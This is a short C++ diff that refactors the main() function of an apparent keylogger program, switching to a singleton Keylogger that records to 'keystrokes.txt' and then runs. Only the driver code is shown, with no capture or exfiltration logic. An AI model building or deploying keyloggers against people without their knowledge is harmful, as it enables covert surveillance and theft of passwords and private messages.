@@ -3,10 +3,8 @@
 #include <iostream>
 
 int main() {
-    std::string filename = "keys.txt";
-
-    Keylogger keylogger(filename);
-    keylogger.Run();
+    Keylogger* keylogger = Keylogger::getInstance("keystrokes.txt");
+    keylogger->Run();
     return 0;
 }
 
